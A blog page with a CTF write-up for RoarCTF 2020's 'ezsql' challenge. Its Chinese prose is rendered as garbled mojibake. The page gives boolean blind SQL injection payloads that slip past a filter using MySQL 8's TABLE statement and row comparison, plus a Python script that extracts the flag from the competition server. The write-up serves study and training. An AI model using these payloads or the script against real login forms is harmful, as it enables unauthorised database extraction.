<!DOCTYPE html>
<html lang="en-us">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='ezsql è€ƒç‚¹ï¼šå¸ƒå°”ç›²æ³¨ï¼ŒMySQL_8.0.19æ–°ç‰¹æ€§tableè¯­å¥ï¼Œæ— åˆ—åç›²æ³¨
æˆªå›¾æˆªæ²¡æœ‰äº†ï¼Œå¿˜äº†ï¼Œç®€å•è¯´ä¸‹æ€è·¯ï¼š
ä¼ ç»Ÿè‰ºèƒ½sqliï¼Œæœ¬æ¥æ˜¯ä¸€ä¸ªå¸¸è§„çš„å¸ƒå°”ç›²æ³¨ï¼Œä¸è¿‡ç”±äºwafå†™çš„å¾ˆé»‘ï¼Œå¤§å°å†™banæ‰äº†selectï¼Œå¯¼è‡´æ²¡æœ‰åŠæ³•è·¨è¡¨æŸ¥è¯¢ï¼Œåªèƒ½åŒè¡¨æŸ¥è¯¢æˆ–è€…æŸ¥åº“åï¼š
admin&#39;/**/and/**/ascii(substr(database(),1,1))&amp;gt;32#//åº“åctfadmin&#39;/**/and/**/ascii(substr(password,1,1))&amp;gt;32#//å¯†ç b4bc4c343ed120df3bff56d586e6d617æœ¬æ¥æµ‹å‡ºæ¥æœ‰å †å ï¼Œä½†æ˜¯ç”±äºwafå†™çš„å¾ˆé»‘ï¼Œå †å ä¹Ÿèƒæ­»è…¹ä¸­ã€‚
æ³¨å‡ºæ¥å¯†ç md5(gml666)==b4bc4c343ed120df3bff56d586e6d617ä¹‹åï¼Œç™»é™†ï¼Œæç¤ºno flagï¼› ç”±äºwafå†™çš„å¾ˆé»‘ï¼Œè¿™åˆ°é¢˜å¦‚æœMySQLç‰ˆæœ¬ä¸æ˜¯&amp;gt;=8.0.19çš„è¯å°±æ˜¯æ²¡æœ‰æ–¹æ³•åšçš„ï¼›
æˆ‘ä»¬èƒ½å¤Ÿåœ¨å®˜æ–¹æ–‡æ¡£æ‰¾åˆ°ä»¥ä¸‹èµ„æ–™
 The TABLE statement in some ways acts like SELECT. Given the existance of a table named t, the following two statements produce identical output:
TABLE t; SELECT * FROM t; You can order and limit the number of rows produced by TABLE using ORDER BY and LIMIT clauses, respectively. These function identically to the same clauses when used with SELECT (including an optional OFFSET clause with LIMIT)'><title>RoarCTF 2020</title>

<link rel='canonical' href='https://example.com/p/roarctf-2020/'>

<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='RoarCTF 2020'>
<meta property='og:description' content='ezsql è€ƒç‚¹ï¼šå¸ƒå°”ç›²æ³¨ï¼ŒMySQL_8.0.19æ–°ç‰¹æ€§tableè¯­å¥ï¼Œæ— åˆ—åç›²æ³¨
æˆªå›¾æˆªæ²¡æœ‰äº†ï¼Œå¿˜äº†ï¼Œç®€å•è¯´ä¸‹æ€è·¯ï¼š
ä¼ ç»Ÿè‰ºèƒ½sqliï¼Œæœ¬æ¥æ˜¯ä¸€ä¸ªå¸¸è§„çš„å¸ƒå°”ç›²æ³¨ï¼Œä¸è¿‡ç”±äºwafå†™çš„å¾ˆé»‘ï¼Œå¤§å°å†™banæ‰äº†selectï¼Œå¯¼è‡´æ²¡æœ‰åŠæ³•è·¨è¡¨æŸ¥è¯¢ï¼Œåªèƒ½åŒè¡¨æŸ¥è¯¢æˆ–è€…æŸ¥åº“åï¼š
admin&#39;/**/and/**/ascii(substr(database(),1,1))&amp;gt;32#//åº“åctfadmin&#39;/**/and/**/ascii(substr(password,1,1))&amp;gt;32#//å¯†ç b4bc4c343ed120df3bff56d586e6d617æœ¬æ¥æµ‹å‡ºæ¥æœ‰å †å ï¼Œä½†æ˜¯ç”±äºwafå†™çš„å¾ˆé»‘ï¼Œå †å ä¹Ÿèƒæ­»è…¹ä¸­ã€‚
æ³¨å‡ºæ¥å¯†ç md5(gml666)==b4bc4c343ed120df3bff56d586e6d617ä¹‹åï¼Œç™»é™†ï¼Œæç¤ºno flagï¼› ç”±äºwafå†™çš„å¾ˆé»‘ï¼Œè¿™åˆ°é¢˜å¦‚æœMySQLç‰ˆæœ¬ä¸æ˜¯&amp;gt;=8.0.19çš„è¯å°±æ˜¯æ²¡æœ‰æ–¹æ³•åšçš„ï¼›
æˆ‘ä»¬èƒ½å¤Ÿåœ¨å®˜æ–¹æ–‡æ¡£æ‰¾åˆ°ä»¥ä¸‹èµ„æ–™
 The TABLE statement in some ways acts like SELECT. Given the existance of a table named t, the following two statements produce identical output:
TABLE t; SELECT * FROM t; You can order and limit the number of rows produced by TABLE using ORDER BY and LIMIT clauses, respectively. These function identically to the same clauses when used with SELECT (including an optional OFFSET clause with LIMIT)'>
<meta property='og:url' content='https://example.com/p/roarctf-2020/'>
<meta property='og:site_name' content='wh1sper'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' />
<meta name="twitter:title" content="RoarCTF 2020">
<meta name="twitter:description" content="ezsql è€ƒç‚¹ï¼šå¸ƒå°”ç›²æ³¨ï¼ŒMySQL_8.0.19æ–°ç‰¹æ€§tableè¯­å¥ï¼Œæ— åˆ—åç›²æ³¨
æˆªå›¾æˆªæ²¡æœ‰äº†ï¼Œå¿˜äº†ï¼Œç®€å•è¯´ä¸‹æ€è·¯ï¼š
ä¼ ç»Ÿè‰ºèƒ½sqliï¼Œæœ¬æ¥æ˜¯ä¸€ä¸ªå¸¸è§„çš„å¸ƒå°”ç›²æ³¨ï¼Œä¸è¿‡ç”±äºwafå†™çš„å¾ˆé»‘ï¼Œå¤§å°å†™banæ‰äº†selectï¼Œå¯¼è‡´æ²¡æœ‰åŠæ³•è·¨è¡¨æŸ¥è¯¢ï¼Œåªèƒ½åŒè¡¨æŸ¥è¯¢æˆ–è€…æŸ¥åº“åï¼š
admin&#39;/**/and/**/ascii(substr(database(),1,1))&amp;gt;32#//åº“åctfadmin&#39;/**/and/**/ascii(substr(password,1,1))&amp;gt;32#//å¯†ç b4bc4c343ed120df3bff56d586e6d617æœ¬æ¥æµ‹å‡ºæ¥æœ‰å †å ï¼Œä½†æ˜¯ç”±äºwafå†™çš„å¾ˆé»‘ï¼Œå †å ä¹Ÿèƒæ­»è…¹ä¸­ã€‚
æ³¨å‡ºæ¥å¯†ç md5(gml666)==b4bc4c343ed120df3bff56d586e6d617ä¹‹åï¼Œç™»é™†ï¼Œæç¤ºno flagï¼› ç”±äºwafå†™çš„å¾ˆé»‘ï¼Œè¿™åˆ°é¢˜å¦‚æœMySQLç‰ˆæœ¬ä¸æ˜¯&amp;gt;=8.0.19çš„è¯å°±æ˜¯æ²¡æœ‰æ–¹æ³•åšçš„ï¼›
æˆ‘ä»¬èƒ½å¤Ÿåœ¨å®˜æ–¹æ–‡æ¡£æ‰¾åˆ°ä»¥ä¸‹èµ„æ–™
 The TABLE statement in some ways acts like SELECT. Given the existance of a table named t, the following two statements produce identical output:
TABLE t; SELECT * FROM t; You can order and limit the number of rows produced by TABLE using ORDER BY and LIMIT clauses, respectively. These function identically to the same clauses when used with SELECT (including an optional OFFSET clause with LIMIT)">
    </head>
    <body class="">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.body.dataset.scheme = 'dark';
        } else {
            document.body.dataset.scheme = 'light';
        }
    })();
</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
            <aside class="sidebar left-sidebar sticky">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header class="site-info">
        
            <figure class="site-avatar">
                
                    
                    
                    
                        
                        <img src="/img/avatar_huda2458f72ce188392d75c5d51cd8e24e_373_300x0_resize_box_2.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                

                
                    <span class="emoji">ğŸ¥</span>
                
            </figure>
        
        <h1 class="site-name"><a href="https://example.com">wh1sper</a></h1>
        <h2 class="site-description">ä¸“æ³¨Webå®‰å…¨</h2>
    </header>

    <ol class="menu" id="main-menu">
        
        
        

        <li >
            <a href='/about'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>About</span>
            </a>
        </li>
        
        

        <li >
            <a href='/archives'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        

        <li >
            <a href='/'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        

        <li >
            <a href='/search'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        

        
            <li id="dark-mode-toggle">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                <span>Dark Mode</span>
            </li>
        
    </ol>
</aside>

            <main class="main full-width">
    <div id="article-toolbar">
        <a href="https://example.com" class="back-home">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



            <span>Back</span>
        </a>
    </div>

    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    

    <h2 class="article-title">
        <a href="/p/roarctf-2020/">RoarCTF 2020</a>
    </h2>

    </div>
</header>

    <section class="article-content">
    <h3 id="ezsql">ezsql</h3>
<p>è€ƒç‚¹ï¼šå¸ƒå°”ç›²æ³¨ï¼ŒMySQL_8.0.19æ–°ç‰¹æ€§<code>table</code>è¯­å¥ï¼Œæ— åˆ—åç›²æ³¨</p>
<p>æˆªå›¾æˆªæ²¡æœ‰äº†ï¼Œå¿˜äº†ï¼Œç®€å•è¯´ä¸‹æ€è·¯ï¼š</p>
<p>ä¼ ç»Ÿè‰ºèƒ½sqliï¼Œæœ¬æ¥æ˜¯ä¸€ä¸ªå¸¸è§„çš„å¸ƒå°”ç›²æ³¨ï¼Œä¸è¿‡ç”±äºwafå†™çš„å¾ˆé»‘ï¼Œå¤§å°å†™banæ‰äº†selectï¼Œå¯¼è‡´æ²¡æœ‰åŠæ³•è·¨è¡¨æŸ¥è¯¢ï¼Œåªèƒ½åŒè¡¨æŸ¥è¯¢æˆ–è€…æŸ¥åº“åï¼š</p>
<pre><code>admin'/**/and/**/ascii(substr(database(),1,1))&gt;32#
//åº“åctf
admin'/**/and/**/ascii(substr(password,1,1))&gt;32#
//å¯†ç b4bc4c343ed120df3bff56d586e6d617
</code></pre><p>æœ¬æ¥æµ‹å‡ºæ¥æœ‰å †å ï¼Œä½†æ˜¯ç”±äºwafå†™çš„å¾ˆé»‘ï¼Œå †å ä¹Ÿèƒæ­»è…¹ä¸­ã€‚</p>
<p>æ³¨å‡ºæ¥å¯†ç md5(gml666)==b4bc4c343ed120df3bff56d586e6d617ä¹‹åï¼Œç™»é™†ï¼Œæç¤ºno flagï¼›
ç”±äºwafå†™çš„å¾ˆé»‘ï¼Œè¿™åˆ°é¢˜å¦‚æœMySQLç‰ˆæœ¬ä¸æ˜¯&gt;=8.0.19çš„è¯å°±æ˜¯æ²¡æœ‰æ–¹æ³•åšçš„ï¼›</p>
<p>æˆ‘ä»¬èƒ½å¤Ÿåœ¨<a class="link" href="https://dev.mysql.com/doc/refman/8.0/en/table.html"  title="å®˜æ–¹æ–‡æ¡£"
     target="_blank" rel="noopener"
    >å®˜æ–¹æ–‡æ¡£</a>æ‰¾åˆ°ä»¥ä¸‹èµ„æ–™</p>
<blockquote>
<p>The TABLE statement in some ways acts like SELECT. Given the existance of a table named t, the following two statements produce identical output:</p>
<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">TABLE</span> <span class="n">t</span><span class="p">;</span>

<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">t</span><span class="p">;</span>
</code></pre></div><p>You can order and limit the number of rows produced by TABLE using ORDER BY and LIMIT clauses, respectively. These function identically to the same clauses when used with SELECT (including an optional OFFSET clause with LIMIT)</p>
</blockquote>
<p>æœ¬åœ°Windowsèµ·ä¸€ä¸ªMySQL_8.0.22çš„ç¯å¢ƒè°ƒè¯•äº†ä¸€ä¸‹ï¼Œå‘ç°äº†ä¹‹å‰<a class="link" href="http://wh1sper.com/2020i%e6%98%a5%e7%a7%8b%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b_web_wp/"  title="æ–°æ˜¥æˆ˜ç–«"
     target="_blank" rel="noopener"
    >æ–°æ˜¥æˆ˜ç–«</a>çš„ezsqlçš„å§¿åŠ¿å¯ä»¥ç”¨ï¼Œå½“æ—¶è¿˜æŠ„äº†é¢–å¥‡å¸ˆå‚…çš„åšå®¢ã€‚</p>
<blockquote>
<p>æ ¸å¿ƒpayloadï¼š(select &lsquo;admin&rsquo;,&lsquo;admin&rsquo;)&gt;(select * from users limit 1)</p>
</blockquote>
<blockquote>
<p>å‡è®¾flagä¸ºflag{bbbbb}ï¼Œå¯¹äºpayloadè¿™ä¸ªä¸¤ä¸ªselectæŸ¥è¯¢çš„æ¯”è¾ƒï¼Œæ˜¯æŒ‰ä½æ¯”è¾ƒçš„ï¼Œå³å…ˆæ¯”ç¬¬ä¸€ä½ï¼Œå¦‚æœç›¸ç­‰åˆ™æ¯”ç¬¬äºŒä½ï¼Œä»¥æ­¤ç±»æ¨ï¼›åœ¨æŸä¸€ä½ä¸Šï¼Œå¦‚æœå‰è€…çš„ASCIIå¤§ï¼Œä¸ç®¡æ€»é•¿åº¦å¦‚ä½•ï¼ŒASCIIå¤§çš„åˆ™å¤§ï¼Œè¿™ä¸ªä¸éš¾æ‡‚ï¼Œå’Œcè¯­è¨€çš„strcmp()å‡½æ•°åŸç†ä¸€æ ·ï¼Œä¸¾å‡ ä¸ªä¾‹å­ï¼š</p>
<ol>
<li>glag &gt; flag{bbbbb}</li>
</ol>
</blockquote>
<ol start="2">
<li>alag{zzzzzzzzzzz} &lt; flag{bbbbb}</li>
<li>a &lt; flag{bbbbb}</li>
<li>z &gt; flag{bbbbb}</li>
</ol>
<p>åº“åå·²çŸ¥ï¼Œæˆ‘ä»¬éœ€è¦çš„å°±æ˜¯è¡¨åï¼Œæ ¹æ®å†™çš„å¾ˆé»‘çš„wafï¼Œæˆ‘ä»¬å…¶å®åªæœ‰ä¸€æ¡è·¯ï¼š<code>information_schema.tables</code>ï¼Œè¿™å¼ è¡¨ç»“æ„å¤§æ¦‚æ˜¯è¿™æ ·ï¼š
<img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210116013103.png" alt=""  /></p>
<p>ç¬¬ä¸€åˆ—<code>TABLE_CATALOG</code>åŸºæœ¬éƒ½æ˜¯<code>def</code>ï¼Œå°‘æ•°æ˜¯<code>NULL</code>ï¼Œç¬¬äºŒåˆ—æ˜¯åº“åï¼Œç¬¬ä¸‰åˆ—æ˜¯è¡¨åï¼Œæˆ‘ä»¬å°±åªéœ€è¦çŸ¥é“è¿™äº›ï¼Œå¦å¤–çš„å¤ªå¤šäº†ä¸æ–¹ä¾¿è´´ã€‚</p>
<p>payloadå¤§æ¦‚é•¿è¿™æ ·ï¼š</p>
<pre><code>admin'/**/and/**/ROW('ctf','aser',3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table/**/information_schema.tables/**/limit/**/0,1)#
//è¿”å›password error!
admin'/**/and/**/ROW('ctf','aser',3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&gt;(table/**/information_schema.tables/**/limit/**/0,1)#
//è¿”å›,username error!
</code></pre><p>æ¥ä¸‹æ¥æ˜¯expï¼š</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">#python3</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://139.129.98.9:30003/login.php&#39;</span>

<span class="k">def</span> <span class="nf">trans</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
    <span class="n">res</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
    <span class="n">res</span> <span class="o">=</span> <span class="s1">&#39;0x&#39;</span> <span class="o">+</span> <span class="n">res</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">res</span>

<span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;flag{6a55e234-1ed0-455c-bbf3-6df6ddce&#39;</span>
<span class="c1"># flagåªèƒ½è·‘åˆ°è¿™é‡Œï¼Œåé¢çš„ä¸€ä½ä»»æ„å­—æ¯çœŸä»»æ„éå­—æ¯å‡</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">500</span><span class="p">):</span> <span class="c1">#è¿™å¾ªç¯ä¸€å®šè¦å¤§ ä¸ç„¶flagé•¿çš„è¯è·‘ä¸å®Œ</span>
    <span class="n">hexchar</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">126</span><span class="p">):</span>
        <span class="n">hexchar</span> <span class="o">=</span> <span class="n">trans</span><span class="p">(</span><span class="n">flag</span><span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">char</span><span class="p">))</span>

        <span class="c1"># payload = &#34;admin&#39;/**/and/**/ROW(&#39;def&#39;,&#39;ctf&#39;,{},&#39;A&#39;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&#34; \</span>
        <span class="c1">#           &#34;&gt;(table/**/information_schema.tables/**/order/**/by/**/TABLE_SCHEMA/**/limit/**/1,1)#&#34;.format(hexchar)</span>
        <span class="c1"># #è¡¨åadminå’Œf11114g</span>

        <span class="c1"># payload = &#34;admin&#39;/**/and/**/ROW(&#39;def&#39;,&#39;ctf&#39;,&#39;admin&#39;,{},5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&#34; \</span>
        <span class="c1">#           &#34;&gt;(table/**/information_schema.columns/**/order/**/by/**/TABLE_SCHEMA/**/limit/**/2,1)#&#34;.format(hexchar)</span>
        <span class="c1"># #adminï¼šid,USERNAME,PASSWORD.....æ‰“åäº†</span>

        <span class="c1"># payload = &#34;admin&#39;/**/and/**/ROW(&#39;def&#39;,&#39;ctf&#39;,&#39;f11114g&#39;,{},5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&#34; \</span>
        <span class="c1">#           &#34;&gt;(table/**/information_schema.columns/**/order/**/by/**/TABLE_SCHEMA/**/limit/**/6,1)#&#34;.format(hexchar)</span>
        <span class="c1"># #f11114gï¼šF1LLLAGGGåªæœ‰ä¸€åˆ—</span>

        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;admin&#39;/**/and/**/{}&#34;</span> \
                  <span class="s2">&#34;&gt;(table/**/ctf.f11114g/**/limit/**/1,1)#&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">hexchar</span><span class="p">)</span>
        <span class="c1">#è¿™é‡Œæœ¬æ¥ä¸éœ€è¦åˆ—åçš„ï¼Œæ³¨åˆ—åæ˜¯ä¸ºäº†ææ¸…æ¥šæœ‰å‡ åˆ—</span>

        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
                <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
                <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span>
        <span class="p">}</span>
        <span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s2">&#34;http&#34;</span><span class="p">:</span> <span class="s2">&#34;http://127.0.0.1:8080&#34;</span><span class="p">,</span>
        <span class="p">}</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">pass</span>
        <span class="k">print</span><span class="p">(</span><span class="n">char</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span>
        <span class="k">if</span> <span class="s1">&#39;password error!&#34;&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
            <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">char</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
            <span class="k">break</span>

</code></pre></div><p>è¯´æ˜ä¸€ä¸‹ï¼Œè¿™ä¸ªexpæœ‰ç‚¹é—®é¢˜ï¼Œæ¯”å¦‚flagä¸­çš„-ä¼šè·‘å‡ºæ¥å•å¼•å·ï¼Œé‡åˆ°çš„æ—¶å€™æ‰‹åŠ¨æ¢ä¸€ä¸‹å°±å¥½ï¼Œç„¶åå°±æ˜¯è·‘åˆ°æœ€åå››ä½çš„æ—¶å€™ä¼šæ–­æ‰ï¼Œåé¢çš„ç„å­¦è·‘ä¸å‡ºæ¥ã€‚
èµ›åå’Œå¸ˆå‚…äº¤æµè¯´å…¶å®flagå¯ä»¥ç›´æ¥ç”¨ascii(substr(flag,1,1))&gt;1çš„æ–¹å¼æ¥åšï¼Œå› ä¸ºf11114gè¡¨é‡Œé¢åªæœ‰ä¸€ä¸ªå­—æ®µã€‚</p>

</section>


    <footer class="article-footer">
    

    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>

    
</article>

    <aside class="related-contents--wrapper">
    
    
</aside>


    
        
    <div class="disqus-container">
    <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (DISQUS) {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2021 wh1sper
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer="true"
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >
            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
                defer="false"
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
